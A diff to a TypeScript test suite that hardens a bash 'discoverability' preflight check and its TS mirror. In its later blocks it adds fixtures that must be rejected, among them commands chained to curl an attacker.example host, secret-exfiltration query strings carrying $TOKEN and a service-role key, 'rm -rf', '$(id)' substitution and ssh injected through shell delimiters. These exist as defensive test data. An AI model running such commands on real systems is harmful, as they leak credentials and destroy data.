@@ -3,13 +3,17 @@ import { readFileSync } from "node:fs";
 import { join } from "node:path";
 import {
   classifyDiscoverabilityResult,
+  EMITTER_ALLOWLIST_PATHSPECS,
+  extractAllObservabilityBlocks,
   extractObservabilityBlock,
   matchExpected,
   parseCommand,
   parseExpected,
   parseKind,
   parseMarker,
+  runLogSubstRejectReason,
   sshRejectReason,
+  stripShellComments,
   substRejectReason,
   type ExecResult,
   type Executor,
@@ -75,7 +79,13 @@ describe("preflight Check 10 — SKILL.md prose invariants", () => {
   });
 
   test("Check 10 explicitly rejects ssh commands (canonical reject regex form)", () => {
-    expect(skill).toMatch(/\(\^\|\[\[:space:\]\]\|\/\)ssh\(\[\[:space:\]\]\|\$\)/);
+    // The negated word class, NOT `[[:space:]]`. A whitespace-only delimiter
+    // misses `|ssh`, `;ssh`, `&&ssh`, `"ssh"` — and cannot be mirrored in JS
+    // without `\s`-vs-`[[:space:]]` Unicode drift.
+    expect(skill).toMatch(
+      /\(\^\|\[\^A-Za-z0-9_\.-\]\)ssh\(\[\^A-Za-z0-9_\.-\]\|\$\)/,
+    );
+    expect(skill).not.toMatch(/\(\^\|\[\[:space:\]\]\|\/\)ssh/);
   });
 
   test("Both Form A and Form B parser shapes are documented inside Check 10", () => {
@@ -87,16 +97,35 @@ describe("preflight Check 10 — SKILL.md prose invariants", () => {
     expect(check10Block![0]).toMatch(/Form B/);
   });
 
-  test("decision matrix exists with exactly one PASS terminal", () => {
+  test("decision matrix row count MATCHES the prose header, with one PASS terminal", () => {
+    // F10: `rows.length >= 12` never cross-checked the prose. A `>=` bound
+    // passes when a row is added and the header is not updated (and vice
+    // versa), so the two could drift silently in both directions. Derive the
+    // expected count from the header and assert EQUALITY.
     const check10Block = skill.match(
       /### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m,
     );
     expect(check10Block).not.toBeNull();
+    const header = check10Block![0].match(
+      /Decision matrix \((\d+) states, (\d+) PASS terminal\)/,
+    );
+    expect(header).not.toBeNull();
+    const declaredStates = Number(header![1]);
+    const declaredPass = Number(header![2]);
+
     const rows = check10Block![0].match(/^\|\s*\d+\s*\|/gm) ?? [];
-    expect(rows.length).toBeGreaterThanOrEqual(12);
+    expect(rows.length).toBe(declaredStates);
+
+    // Row numbers must be 1..N with no gaps or duplicates — a renumbering slip
+    // would otherwise still satisfy a bare count.
+    const numbers = rows.map((r) => Number(r.match(/\d+/)![0]));
+    expect(numbers).toEqual(
+      Array.from({ length: declaredStates }, (_, i) => i + 1),
+    );
+
     const passRows =
       check10Block![0].match(/^\|\s*\d+\s*\|[^\n]*\*\*PASS\*\*/gm) ?? [];
-    expect(passRows.length).toBe(1);
+    expect(passRows.length).toBe(declaredPass);
   });
 
   test("Fast-path SKIP table includes Check 10 row", () => {
@@ -133,16 +162,45 @@ describe("preflight Check 10 — SKILL.md prose invariants", () => {
     expect(substReject).toBeGreaterThan(kindStep);
   });
 
-  test("guardrail 4 shell form excludes planning artifacts (non-vacuity)", () => {
-    // Without the two exclusion pathspecs the check is vacuous: the plan that
-    // declares the marker is itself in the tree, so `git grep` always matches.
+  test("guardrail 4 restricts the emitter grep to the executing-surface allowlist", () => {
+    // A two-entry blacklist (`:!knowledge-base/project/{plans,specs}`) was
+    // self-satisfiable — every OTHER author-controlled file counted, including
+    // this suite's own fixtures. The allowlist inverts the burden. Asserted
+    // against the shared EMITTER_ALLOWLIST_PATHSPECS constant so the two copies
+    // cannot drift, not against hand-copied literals.
     const check10Block = skill.match(
       /### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m,
     );
     expect(check10Block).not.toBeNull();
     expect(check10Block![0]).toMatch(/git grep[^\n]*-F -- "\$MARKER"/);
-    expect(check10Block![0]).toMatch(/':!knowledge-base\/project\/plans'/);
-    expect(check10Block![0]).toMatch(/':!knowledge-base\/project\/specs'/);
+    for (const spec of EMITTER_ALLOWLIST_PATHSPECS) {
+      expect(check10Block![0]).toContain(`'${spec}'`);
+    }
+    // The self-satisfiable blacklist must be gone, not merely supplemented.
+    expect(check10Block![0]).not.toMatch(/':!knowledge-base\/project\/plans'/);
+  });
+
+  test("F7: every guardrail-4 pathspec is cwd-independent (`:(top)`)", () => {
+    // A bare `knowledge-base/project/plans` pathspec is CWD-relative: run from
+    // `knowledge-base/project/` it silently stops covering what it names. The
+    // PR's original test only grepped SKILL.md for the literal strings, so it
+    // passed with the cwd-dependent form too. Assert the PROPERTY instead.
+    for (const spec of EMITTER_ALLOWLIST_PATHSPECS) {
+      expect(spec.startsWith(":(top)")).toBe(true);
+    }
+    const check10Block = skill.match(
+      /### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m,
+    );
+    const grepLine = check10Block![0]
+      .split("\n")
+      .find((l) => l.includes('git grep -q -F -- "$MARKER"'));
+    expect(grepLine).toBeDefined();
+    // No pathspec on the runtime's grep line may lack the `:(top)` prefix.
+    const pathspecs = grepLine!.match(/'[^']+'/g) ?? [];
+    expect(pathspecs.length).toBeGreaterThan(0);
+    for (const p of pathspecs) {
+      expect(p.startsWith("':(top)")).toBe(true);
+    }
   });
 
   test("guardrail 4 does NOT grep preflight-diff-files.txt for the marker", () => {
@@ -163,6 +221,198 @@ describe("preflight Check 10 — SKILL.md prose invariants", () => {
     expect(check10Block![0]).toMatch(/\^\[A-Za-z0-9_\]\+\$/);
     expect(check10Block![0]).toMatch(/run-log/);
     expect(check10Block![0]).toMatch(/live-probe/);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// F2 — bash ↔ TS logic-parity guard.
+//
+// THE DEFECT THIS EXISTS TO KILL: every test above this block exercises the
+// TypeScript MIRROR. The bash in SKILL.md is the production runtime. Mutating
+// the bash — turning all seven guardrail `exit 1`s into `:`, widening the
+// marker charset to `^.+$`, inverting the command-names-marker predicate,
+// deleting guardrail 7's block, making the run-log terminal emit `PASS:` —
+// left the 85-test suite fully green. Seven guards that structurally cannot
+// fail, inside the deliverable whose thesis is that guards must be able to fail.
+//
+// Shape follows the precedent named in plugins/soleur/AGENTS.md: "a presence
+// grep is insufficient — the copy that runs must match the copy that is
+// tested" (plan-review/lib/named-panel.mjs + plan-review-named-panel.test.ts).
+// Full normalized equivalence is impossible across two LANGUAGES, so this guard
+// has two halves:
+//
+//   (a) PREDICATE PARITY — for each decision literal that exists in both
+//       copies, extract it from each SOURCE FILE and compare after normalizing
+//       away only the escapes bash ERE requires and JS does not. Not a presence
+//       grep: the two literals must be equal.
+//   (b) EXECUTABLE STRUCTURE — assert the properties a mutation destroys:
+//       every FAIL diagnostic is followed by a real `exit 1`, each predicate
+//       appears in NON-COMMENT text with the correct polarity, and the run-log
+//       terminal emits SKIP and never PASS.
+// ---------------------------------------------------------------------------
+describe("F2: the bash runtime and the TS mirror cannot silently drift", () => {
+  const skill = readFileSync(SKILL_PATH, { encoding: "utf8" });
+  const parserSrc = readFileSync(
+    join(import.meta.dir, "lib", "discoverability-test-parser.ts"),
+    { encoding: "utf8" },
+  );
+
+  const check10 = skill.match(/### Check 10:[\s\S]*?(?=^### Check \d+|^## )/m);
+  if (!check10) throw new Error("Check 10 section not found in preflight/SKILL.md");
+
+  /** Every fenced code block inside Check 10, concatenated. */
+  const fencedSource = (check10![0].match(/```(?:bash|text)\n[\s\S]*?```/g) ?? [])
+    .map((f) => f.replace(/^```(?:bash|text)\n/, "").replace(/```$/, ""))
+    .join("\n");
+
+  /**
+   * Lines of the runtime that ACTUALLY EXECUTE — full-line `#` comments and
+   * blanks removed. Every assertion below runs against this, never against the
+   * raw text: a predicate that survives only inside a comment is a predicate
+   * that does not run, which is precisely the mutation class this guard hunts.
+   */
+  const execLines = fencedSource
+    .split("\n")
+    .filter((l) => l.trim() !== "" && !/^\s*#/.test(l));
+  const execText = execLines.join("\n");
+
+  /**
+   * Normalize away escapes that bash ERE requires inside `[[ =~ ]]` but a JS
+   * regex literal does not. Nothing else is touched — in particular `\|`,
+   * `\$` and `\(` survive, so an actual alternation/anchor difference between
+   * the copies still fails the comparison.
+   */
+  const norm = (re: string): string => re.replace(/\\([;&<>`])/g, "$1");
+
+  /** The ERE from the bash `[[ … =~ <ERE> ]]` line matching `anchor`. */
+  const bashEre = (anchor: string | RegExp): string => {
+    const line = execLines.find((l) =>
+      typeof anchor === "string" ? l.includes(anchor) : anchor.test(l),
+    );
+    if (!line) return "";
+    const m = line.match(/=~\s+(.+?)\s+\]\]/);
+    return m ? norm(m[1]) : "";
+  };
+
+  /** The pattern body of `const <name> = /…/flags;` in the TS mirror. */
+  const tsRe = (name: string): string => {
+    const m = parserSrc.match(
+      new RegExp(`^const ${name} = /(.*)/[a-z]*;$`, "m"),
+    );
+    return m ? norm(m[1]) : "";
+  };
+
+  // ---- (a) predicate parity: same literal in both copies ----
+
+  // Anchors are chosen to be unique across the two substitution rejects, which
+  // are otherwise near-identical: only guardrail 8 has `\|\||\&|\$` (no bare
+  // `|`/`>`/`<` alternatives), only Step 10.5 has `\|\||\||\>`.
+  const ANCHOR_RUNLOG = "\\|\\||\\&|\\$";
+  const ANCHOR_SUBST = "\\|\\||\\||\\>";
+  const PARITY: Array<[label: string, tsName: string, bashAnchor: string]> = [
+    ["ssh reject", "SSH_REJECT_RE", '"$CMD" =~ (^|[^A-Za-z0-9_.-])ssh'],
+    ["marker charset", "MARKER_CHARSET_RE", '"$MARKER" =~'],
+    ["run-log endorsement reject", "RUNLOG_SUBST_REJECT_RE", ANCHOR_RUNLOG],
+    ["live-probe substitution reject", "SUBST_REJECT_RE", ANCHOR_SUBST],
+  ];
+
+  for (const [label, tsName, anchor] of PARITY) {
+    test(`${label}: the bash literal and the TS literal are identical`, () => {
+      const ts = tsRe(tsName);
+      const bash = bashEre(anchor);
+      expect(ts).not.toBe(""); // the TS literal must be extractable
+      expect(bash).not.toBe(""); // the bash literal must be extractable
+      expect(bash).toBe(ts);
+    });
+  }
+
+  test("guardrail 8 is strictly narrower than the live-probe reject", () => {
+    // The whole point of a separate run-log reject: bare `|`, `<`, `>` must be
+    // ALLOWED (the canonical `gh run view <run-id> --log | grep MARKER` needs
+    // them) while `;`, `&&`, `||`, `&`, `$…` are not. If someone "simplifies"
+    // by pointing guardrail 8 at SUBST_REJECT_RE, the feature breaks.
+    expect(tsRe("RUNLOG_SUBST_REJECT_RE")).not.toBe(tsRe("SUBST_REJECT_RE"));
+    expect(runLogSubstRejectReason("gh run view <run-id> --log | grep M")).toBeNull();
+    expect(substRejectReason("gh run view <run-id> --log | grep M")).not.toBeNull();
+  });
+
+  // ---- (b) executable structure: the properties each mutation destroys ----
+
+  test("MUTATION `exit 1` → `:` — every FAIL diagnostic is followed by a real exit 1", () => {
+    // Kills the mutation that neuters all seven (now eight) guardrails at once.
+    // A guard that prints FAIL and returns 0 is not a guard.
+    const failEchoes = execLines
+      .map((l, i) => [l, i] as const)
+      .filter(([l]) => /echo "FAIL:/.test(l));
+    expect(failEchoes.length).toBeGreaterThanOrEqual(8);
+    for (const [line, i] of failEchoes) {
+      // `exit 1` on the diagnostic's own line (the `|| { echo …; exit 1; }`
+      // shape) or within the next two executable lines (the `if … then` shape).
+      const window = [line, ...execLines.slice(i + 1, i + 3)].join("\n");
+      expect(
+        /(^|\s)exit 1\s*(;|$)/m.test(window),
+        `FAIL diagnostic is not paired with an executable \`exit 1\`: ${line.trim()}`,
+      ).toBe(true);
+    }
+  });
+
+  test("MUTATION charset → `^.+$` — guardrail 3 runs the real charset predicate", () => {
+    expect(execText).toContain('[[ ! "$MARKER" =~ ^[A-Za-z0-9_]+$ ]]');
+    expect(bashEre('"$MARKER" =~')).toBe("^[A-Za-z0-9_]+$");
+  });
+
+  test("MUTATION invert guardrail 5 — the command-names-marker polarity is pinned", () => {
+    // `!=` is the only correct polarity: FAIL when the command does NOT name
+    // the marker. Inverting to `==` FAILs every valid run-log and passes every
+    // invalid one, and left the mirror-only suite green.
+    expect(execText).toContain('[[ "$CMD_CODE" != *"$MARKER"* ]]');
+    expect(execText).not.toMatch(/\[\[ "\$CMD(_CODE)?" == \*"\$MARKER"\* \]\]/);
+    // Comment-stripped, per F5 — the raw $CMD must NOT be the tested value.
+    expect(execText).toMatch(/CMD_CODE=\$\(printf[^\n]*sed[^\n]*#/);
+  });
+
+  test("MUTATION delete guardrail 7 — the marker-without-run-log block is executable", () => {
+    expect(execText).toMatch(
+      /\[\[ "\$KIND" != "run-log" && "\$HAS_MARKER_TOKEN" -gt 0 \]\]/,
+    );
+  });
+
+  test("MUTATION SKIP → PASS — the run-log terminal emits SKIP and never PASS", () => {
+    expect(execText).toMatch(/echo "SKIP: discoverability_test declares kind: run-log/);
+    expect(execText).not.toMatch(/echo "PASS:/);
+    // The terminal must exit 0 (a SKIP), not fall through into the live probe.
+    const skipIdx = execLines.findIndex((l) => /echo "SKIP: discoverability_test declares kind: run-log/.test(l));
+    expect(skipIdx).toBeGreaterThan(-1);
+    expect(execLines[skipIdx + 1].trim()).toBe("exit 0");
+  });
+
+  test("MUTATION drop the emitter allowlist — guardrail 4's grep is restricted", () => {
+    const grepLine = execLines.find((l) =>
+      l.includes('git grep -q -F -- "$MARKER"'),
+    );
+    expect(grepLine).toBeDefined();
+    for (const spec of EMITTER_ALLOWLIST_PATHSPECS) {
+      expect(grepLine!).toContain(`'${spec}'`);
+    }
+  });
+
+  test("MUTATION reorder — kind resolution stays between the two rejects, in the EXECUTABLE text", () => {
+    // The prose-index version of this test (above) compares positions in the
+    // raw markdown, so a comment mentioning the reject would satisfy it. This
+    // one runs against executable lines only.
+    const idx = (needle: string) =>
+      execLines.findIndex((l) => l.includes(needle));
+    const ssh = idx('"$CMD" =~ (^|[^A-Za-z0-9_.-])ssh');
+    const kind = idx("KIND=$(grep -oE");
+    const subst = idx(ANCHOR_SUBST);
+    expect(ssh).toBeGreaterThan(-1);
+    expect(kind).toBeGreaterThan(ssh);
+    expect(subst).toBeGreaterThan(kind);
+  });
+
+  test("the mirror's SSOT contract is stated in both files", () => {
+    expect(parserSrc).toMatch(/the bash wins and this file\s*\n?\s*\*?\s*is the bug/);
+    expect(check10![0]).toMatch(/If they drift, the bash wins/);
   });
 });
 
@@ -1066,11 +1316,315 @@ describe("The LUKS plan (#6774's motivating case) now classifies as run-log SKIP
       "--",
       "SOLEUR_WORKSPACES_LUKS_FSCK",
       "--",
-      ":!knowledge-base/project/plans",
-      ":!knowledge-base/project/specs",
+      ...EMITTER_ALLOWLIST_PATHSPECS,
     ]).stdout.toString();
     expect(out.trim().length).toBeGreaterThan(0);
     expect(out).toMatch(/apps\/web-platform\/infra\//);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// F1 — the run-log arm reopened the ssh reject, and endorsed shell-active
+// commands. Both halves are regressions RELATIVE TO origin/main: on main the
+// fused reject ran ssh + substitution unconditionally, so `|ssh` tripped the
+// substitution rule's `|`. Moving the substitution reject below the run-log
+// branch removed that accidental cover.
+// ---------------------------------------------------------------------------
+describe("F1a: the ssh reject survives every delimiter, not just whitespace", () => {
+  const SSH_SHAPES: Array<[fixture: string, cmd: string]> = [
+    ["17-run-log-piped-ssh.md", "gh run view 1 --log|ssh box grep SOLEUR_TEST_MARKER_09"],
+    ["18-run-log-semicolon-ssh.md", "gh run view 1 --log;ssh box grep SOLEUR_TEST_MARKER_09"],
+    ["19-run-log-andand-ssh.md", "gh run view 1 --log&&ssh box grep SOLEUR_TEST_MARKER_09"],
+    ["20-run-log-spaced-semicolon-ssh.md", "gh run view 1 --log ; ssh box grep SOLEUR_TEST_MARKER_09"],
+    ["21-run-log-quoted-ssh.md", '"ssh" box grep SOLEUR_TEST_MARKER_09'],
+  ];
+
+  for (const [fixture, cmd] of SSH_SHAPES) {
+    test(`fixture ${fixture} → FAIL on ssh (every guardrail otherwise satisfied)`, async () => {
+      const result = await classify(fx(fixture), { markerLookup: () => true });
+      expect(`${fixture}:${result.result}`).toBe(`${fixture}:FAIL`);
+      expect(result.reason).toMatch(/ssh/i);
+    });
+
+    test(`sshRejectReason fires directly on: ${cmd}`, () => {
+      expect(sshRejectReason(cmd)).not.toBeNull();
+    });
+  }
+
+  test("the widened class does NOT create false positives", () => {
+    // `sshd`, `pushshell` and identifiers containing `ssh` must still pass —
+    // `.`, `-` and `_` remain word characters.
+    for (const safe of [
+      "systemctl status sshd",
+      "grep pushshell /var/log/x",
+      "gh run view <run-id> --log | grep SOLEUR_ssh_x",
+      "curl https://ssh.example.com.invalid/health",
+      "curl https://x/health",
+    ]) {
+      expect(`${safe}:${sshRejectReason(safe)}`).toBe(`${safe}:null`);
+    }
+  });
+
+  test("the reject is not delegated to the substitution rule (which no longer runs here)", () => {
+    // On origin/main `|ssh` was caught only because the substitution reject ran
+    // unconditionally and tripped on `|`. Prove the ssh rule stands alone:
+    // strip every shell-active token and it must STILL fire.
+    expect(sshRejectReason('"ssh" box grep M')).not.toBeNull();
+    expect(runLogSubstRejectReason('"ssh" box grep M')).toBeNull();
+  });
+});
+
+describe("F1b: guardrail 8 — a run-log SKIP must not endorse a chaining/expanding command", () => {
+  test("fixture 22: command substitution → FAIL, and NOT via a marker guardrail", async () => {
+    const result = await classify(fx("22-run-log-command-substitution.md"), {
+      markerLookup: () => true,
+    });
+    expect(result.result).toBe("FAIL");
+    expect(result.reason).toMatch(/endorse/i);
+    expect(result.reason).not.toMatch(/does not contain that literal/);
+  });
+
+  test("fixture 23: `&& curl …?d=$TOKEN` → FAIL even though every marker guardrail passes", async () => {
+    const result = await classify(fx("23-run-log-chained-exfil.md"), {
+      markerLookup: () => true,
+    });
+    expect(result.result).toBe("FAIL");
+    expect(result.reason).toMatch(/endorse/i);
+  });
+
+  test("MANY chaining/expansion shapes all FAIL under run-log", async () => {
+    const bad = [
+      "gh run view 1 --log | grep SOLEUR_M; curl https://attacker.example",
+      "gh run view 1 --log | grep SOLEUR_M && rm -rf /tmp/x",
+      "gh run view 1 --log | grep SOLEUR_M || curl https://attacker.example",
+      "gh run view 1 --log | grep SOLEUR_M &",
+      "gh run view $(id) --log | grep SOLEUR_M",
+      "gh run view `id` --log | grep SOLEUR_M",
+      "gh run view <(id) --log | grep SOLEUR_M",
+      "gh run view >(id) --log | grep SOLEUR_M",
+      "gh run view 1 --log | grep SOLEUR_M?t=$TOKEN",
+      "gh run view 1 --log | grep SOLEUR_M?t=${SUPABASE_SERVICE_ROLE_KEY}",
+    ];
+    for (const cmd of bad) {
+      const result = await classify(
+        yamlPlan([
+          "kind: run-log",
+          "marker: SOLEUR_M",
+          `command: ${cmd}`,
+          'expected_output: "row"',
+        ]),
+        { markerLookup: () => true },
+      );
+      expect(`${cmd}:${result.result}`).toBe(`${cmd}:FAIL`);
+    }
+  });
+
+  test("bare `|`, `<`, `>` are STILL allowed — the canonical run-log shape survives", async () => {
+    // If guardrail 8 were the full live-probe reject, this would FAIL and the
+    // feature would be dead on its own canonical example.
+    const result = await classify(
+      yamlPlan([
+        "kind: run-log",
+        "marker: SOLEUR_M",
+        "command: gh run view <run-id> --log | grep SOLEUR_M",
+        'expected_output: "row"',
+      ]),
+      { markerLookup: () => true },
+    );
+    expect(result.result).toBe("SKIP");
+    expect(result.marker).toBe("SOLEUR_M");
+  });
+
+  test("guardrail 8 does not leak into live-probe (which has its own, wider reject)", async () => {
+    // A live-probe with `|` must still FAIL — via the Step 10.5 reject.
+    const result = await classify(
+      yamlPlan([
+        "kind: live-probe",
+        "command: curl https://app.soleur.ai/health | sh",
+        'expected_output: "200"',
+      ]),
+    );
+    expect(result.result).toBe("FAIL");
+    expect(result.reason).toMatch(/shell-active/i);
+  });
+});
+
+describe("F3: quote charset follows the bash, which accepts `\"` only", () => {
+  test("fixture 24: `kind: 'run-log'` FAILs, matching the bash runtime", async () => {
+    const result = await classify(fx("24-single-quoted-kind.md"), {
+      markerLookup: () => true,
+    });
+    expect(result.result).toBe("FAIL");
+    expect(result.reason).toMatch(/kind/i);
+  });
+
+  test("double quotes parse; single quotes do not (both keys)", () => {
+    expect(parseKind(yamlPlan(['kind: "run-log"']))).toBe("run-log");
+    expect(parseKind(yamlPlan(["kind: 'run-log'"]))).toBeNull();
+    expect(parseMarker(yamlPlan(['marker: "SOLEUR_M"']))).toBe("SOLEUR_M");
+    expect(parseMarker(yamlPlan(["marker: 'SOLEUR_M'"]))).toBe("'SOLEUR_M'");
+  });
+
+  test("a single-quoted marker is malformed, never silently unquoted", async () => {
+    const result = await classify(
+      yamlPlan([
+        "kind: run-log",
+        "marker: 'SOLEUR_M'",
+        "command: gh run view <run-id> --log | grep SOLEUR_M",
+        'expected_output: "row"',
+      ]),
+      { markerLookup: () => true },
+    );
+    expect(result.result).toBe("FAIL");
+    expect(result.reason).toMatch(/malformed/i);
+  });
+});
+
+describe("F4: the single-block runtime view anchors `## Observability` exactly", () => {
+  const CITATION_FIRST = [
+    "# Plan",
+    "",
+    "## Observability layer citation",
+    "",
+    "Per hr-observability-layer-citation, errors surface in Sentry.",
+    "",
+    "## Observability",
+    "",
+    "```yaml",
+    "discoverability_test:",
+    "  command: curl -fsS https://app.soleur.ai/health",
+    '  expected_output: "200"',
+    "```",
+    "",
+    "## Acceptance Criteria",
+  ].join("\n");
+
+  const SUFFIXED_ONLY = [
+    "# Plan",
+    "",
+    "## Observability / Rollback",
+    "",
+    "Roll back by reverting the deploy; alerts fire in Better Stack.",
+    "",
+    "## Acceptance Criteria",
+  ].join("\n");
+
+  test("a `## Observability layer citation` section does not shadow the real block", () => {
+    // Measured before the fix: bash extracted the real block (PASS), the
+    // prefix-matching mirror extracted the citation (FAIL).
+    const block = extractObservabilityBlock(CITATION_FIRST);
+    expect(block).toMatch(/discoverability_test/);
+    expect(block).not.toMatch(/hr-observability-layer-citation/);
+  });
+
+  test("`## Observability / Rollback` alone yields NO block, exactly as the awk does", () => {
+    // Measured before the fix: bash yielded 0 bytes (FAIL), the mirror yielded
+    // 251 bytes and parsed on. That shape exists on disk today.
+    expect(extractObservabilityBlock(SUFFIXED_ONLY)).toBe("");
+  });
+
+  test("a suffixed-heading plan therefore FAILs on the missing block, not on a parse", async () => {
+    const result = await classifyDiscoverabilityResult({
+      planPath: "fixtures/synthetic-suffixed.md",
+      planBody: SUFFIXED_ONLY,
+      prBody: "knowledge-base/project/plans/fixtures/synthetic-suffixed.md",
+      runner: stubExecutor(0, "200\n"),
+    });
+    expect(result.result).toBe("FAIL");
+    expect(result.reason).toMatch(/missing the ## Observability block/);
+  });
+
+  test("extractAllObservabilityBlocks KEEPS the prefix form for its second consumer", () => {
+    // The schema-parity guard walks plan-issue-templates.md's per-tier
+    // sections, whose headings are suffixed. Anchoring that view would break it.
+    expect(extractAllObservabilityBlocks(CITATION_FIRST).length).toBe(2);
+    expect(extractAllObservabilityBlocks(SUFFIXED_ONLY).length).toBe(1);
+  });
+
+  test("the runtime awk in SKILL.md is anchored too (the mirror follows it)", () => {
+    const skill = readFileSync(SKILL_PATH, { encoding: "utf8" });
+    expect(skill).toMatch(/awk '\/\^## Observability\$\/\{ino=1; next\}/);
+  });
+});
+
+describe("F5: guardrail 5 rejects a marker mentioned only in a comment", () => {
+  test("fixture 25: block scalar whose only marker mention is commented out → FAIL", async () => {
+    const result = await classify(
+      fx("25-run-log-block-scalar-commented-marker.md"),
+      { markerLookup: () => true },
+    );
+    expect(result.result).toBe("FAIL");
+    expect(result.reason).toMatch(/outside of shell comments/);
+  });
+
+  test("the fixture really is a block scalar carrying the marker in its raw text", () => {
+    // Pins WHY the old check passed: Form A block scalars keep `#` lines, so
+    // the raw command DOES contain the marker literal.
+    const block = extractObservabilityBlock(
+      fx("25-run-log-block-scalar-commented-marker.md"),
+    );
+    const cmd = parseCommand(block);
+    expect(cmd).toContain("SOLEUR_TEST_MARKER_25");
+    expect(cmd).toMatch(/^\s*#/m);
+  });
+
+  test("MANY comment-only mention shapes all FAIL", async () => {
+    const commentedOnly = [
+      "echo unrelated\n# SOLEUR_M",
+      "echo unrelated\n  # grep SOLEUR_M would show it",
+      "echo unrelated # SOLEUR_M",
+    ];
+    for (const cmd of commentedOnly) {
+      const result = await classify(
+        [
+          "## Observability",
+          "",
+          "```yaml",
+          "discoverability_test:",
+          "  kind: run-log",
+          "  marker: SOLEUR_M",
+          '  expected_output: "row"',
+          "  command: |",
+          ...cmd.split("\n").map((l) => `    ${l.replace(/^\s+/, "")}`),
+          "```",
+        ].join("\n"),
+        { markerLookup: () => true },
+      );
+      expect(`${JSON.stringify(cmd)}:${result.result}`).toBe(
+        `${JSON.stringify(cmd)}:FAIL`,
+      );
+      expect(result.reason).toMatch(/outside of shell comments/);
+    }
+  });
+
+  test("an executable mention still passes — the fix is not a blanket reject", async () => {
+    const result = await classify(
+      [
+        "## Observability",
+        "",
+        "```yaml",
+        "discoverability_test:",
+        "  kind: run-log",
+        "  marker: SOLEUR_M",
+        '  expected_output: "row"',
+        "  command: |",
+        "    # find the marker in the run log",
+        "    gh run view <run-id> --log | grep SOLEUR_M",
+        "```",
+      ].join("\n"),
+      { markerLookup: () => true },
+    );
+    expect(result.result).toBe("SKIP");
+    expect(result.marker).toBe("SOLEUR_M");
+  });
+
+  test("a `#` glued to a non-space character is a URL fragment, not a comment", () => {
+    // `https://x/y#SOLEUR_M` must keep the marker: stripping it would create a
+    // false FAIL, the opposite failure mode.
+    expect(
+      stripShellComments("curl https://x/y#SOLEUR_M"),
+    ).toContain("SOLEUR_M");
+    expect(stripShellComments("echo x # SOLEUR_M")).not.toContain("SOLEUR_M");
   });
 });
 
